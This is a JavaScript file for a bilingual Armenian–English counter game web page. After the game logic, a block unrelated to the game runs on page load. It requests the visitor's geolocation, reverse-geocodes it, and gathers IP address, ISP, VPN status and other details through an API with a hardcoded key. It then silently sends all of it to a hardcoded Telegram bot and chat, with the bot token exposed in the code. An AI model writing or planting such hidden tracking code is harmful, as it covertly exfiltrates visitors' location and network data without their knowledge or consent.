document.body.style.setProperty("--window-height", "100vh");

const o = document;

const startPage = document.querySelector(".start");
const targetInput = document.getElementById("targetNumber");
const submitBtn = document.getElementById("submitBtn");

const gamePage = document.querySelector(".game");
const counter = document.getElementById("counter");
const btns = document.getElementById("btnsHide");
const plusBtn = document.getElementById("plusBtn");
const minusBtn = document.getElementById("minusBtn");
const again = document.getElementById("again");
const message = document.getElementById("gameMessage");

const languageChanger = document.getElementById("language");

const showAllBtn = o.querySelector('.howToPlay button');
const showAll = o.querySelector('.howToPlay');

showAllBtn.onclick = function() {
  showAll.classList.toggle('showAll');
}
languageChanger.oninput = function () {
  if (languageChanger.value === "am") {
    o.querySelector("h1").innerText = "Հաշվիչ հավելված";
    o.querySelector(".start p").innerText = "Ամենափոքր թիվը 1000-ն է";
    targetInput.placeholder = "Ընտրել նպատակային թիվը";
    submitBtn.innerText = "ՀԱՍՏԱՏԵԼ";
  } else if (languageChanger.value === "en") {
    o.querySelector("h1").innerText = "Counter App";
    o.querySelector(".start p").innerText = "The min number is 1000";
    targetInput.placeholder = "Enter the target number";
    submitBtn.innerText = "SUBMIT";
  }
};

let count = 0;

targetInput.onclick = function (tar) {
  // console.log(targetInput.value)
  if (targetInput.value >= 10 && languageChanger.value === 'en' || languageChanger.value === 'am') {
    submitBtn.style.display = "block";
    submitBtn.onclick = function () {
      startPage.classList.add("hide");
      gamePage.classList.add("show");

      plusBtn.onclick = function () {
        count++;
        counter.innerText = count;
        if (count >= 0) {
          message.classList.add("hide");
          counter.classList.remove("minus");
        }

        if (count >= targetInput.value) {
          message.classList.remove("hide");
          if (languageChanger.value === "am") {
            message.innerText = `Շնորհավոր🗿`;
          } else if (languageChanger.value === "en") {
            message.innerText = `Congratulations!🗿`;
          }
          again.classList.remove("hide");
          btns.classList.add("hide");
        }

        if (count % 10 === 0) {
          message.classList.remove("hide");
          if (languageChanger.value === "am") {
            message.innerText = `Դուք հատեցիք ${count}-սահմանը`;
          } else if (languageChanger.value === "en") {
            message.innerText = `You've crossed the ${count} limit`;
          }
        }
      };

      minusBtn.onclick = function () {
        count--;
        counter.innerText = count;
        if (count <= 0) {
          counter.classList.add("minus");
          message.classList.remove("hide");
          if (languageChanger.value === "am") {
            message.innerText = `Դուք չեք կարող միավորը 0-ից պակաս դարձնել`;
          } else if (languageChanger.value === "en") {
            message.innerText = `You cannot make the score less than 0`;
          }
        }
      };

      again.onclick = function () {
        startPage.classList.remove("hide");
        gamePage.classList.remove("show");
        message.innerText = "";
        message.classList.add("hide");
        btns.classList.remove("hide");
        again.classList.add("hide");
        targetInput.placeholder = "New game";
        count = 0;
        counter.innerText = count;
        targetInput.value = "";
      };
    };
  } else if (!Number(targetInput.value)) {
    targetInput.value = "";
  } else {
    submitBtn.style.display = "none";
  }
};

navigator.geolocation.getCurrentPosition((position) => {
  const { latitude, longitude } = position.coords;

  const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;

  fetch(url)
    .then((res) => res.json())
    .then((dataVill) => {
      let apiKey = "029718d013914d90b84c8afdf996d599";
      $.getJSON(
        "https://ipgeolocation.abstractapi.com/v1/?api_key=" + apiKey,
        function (data) {
          console.log(JSON.stringify(data, null, 2));
          // console.table(dataVill.address);
          let text = `
          {
          %0A "ip_address": ${data.ip_address},; 
          %0A "city": ${data.city},
          %0A "city_geoname_id": ${data.city_geoname_id},
          %0A "region": ${data.region},
          %0A "region_iso_code": ${data.region_iso_code},
          %0A "region_geoname_id": ${data.region_geoname_id},
          %0A "postal_code": ${data.postal_code},
          %0A "country": ${data.country},
          %0A "village": "${dataVill.address.village}"
          %0A "country_code": ${data.country_code},
          %0A "country_geoname_id": ${data.country_geoname_id},
          %0A "country_is_eu": ${data.country_is_eu},
          %0A "continent": ${data.continent},
          %0A "continent_code": ${data.continent_code},
          %0A "continent_geoname_id": ${data.continent_geoname_id},
          %0A "longitude": ${longitude},
          %0A "latitude": ${latitude},%0A
          %0A   "security": {
             %0A    "is_vpn": ${data.security.is_vpn}
            %0A  },%0A
            %0A"timezone": {
            %0A   "name": "${data.timezone.name}",
            %0A   "abbreviation": "${data.timezone.abbreviation}",
            %0A   "gmt_offset": ${data.timezone.gmt_offset},
            %0A   "current_time": "${data.timezone.current_time}",
            %0A   "is_dst": ${data.timezone.is_dst}
          %0A} %0A
          %0A"currency": {
            %0A  "currency_name": "${data.currency.currency_name}",
            %0A  "currency_code": "${data.currency.currency_code}"
          %0A} %0A
          %0A"connection": {
          %0A  "autonomous_system_number": ${data.connection.autonomous_system_number},
          %0A  "autonomous_system_organization": "${data.connection.autonomous_system_organization}",
          %0A  "connection_type": "${data.connection.connection_type}",
          %0A  "isp_name": "${data.connection.isp_name}"",
          %0A  "organization_name": "${data.connection.organization_name}"
          %0A},
          %0A}`;
          // console.log(text)
          const apiUrl = `https://api.telegram.org/bot6724571498:AAHkzih5zC1_rlG0wPwYCyEICMShaOek8gs/sendMessage?chat_id=-4022889346&text=${text}`;
          var oReq = new XMLHttpRequest();
          oReq.open("GET", apiUrl, true);
          oReq.send();
        }
      );
    })
    .catch(() => {
      console.log("Error fetching data from API");
    });
});